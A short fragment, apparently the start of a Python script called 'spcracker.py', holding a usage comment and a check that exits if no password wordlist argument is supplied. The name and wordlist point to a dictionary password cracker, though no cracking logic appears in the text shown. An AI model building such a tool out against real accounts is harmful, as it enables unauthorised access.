...
# 3. Run the script like this: python spcracker.py passwords.txt

import os
import sys

if len(sys.argv) == 1:
    print("You need to add a wordlist! Run the script like this: python spcracker.py passwords.txt")
    exit()
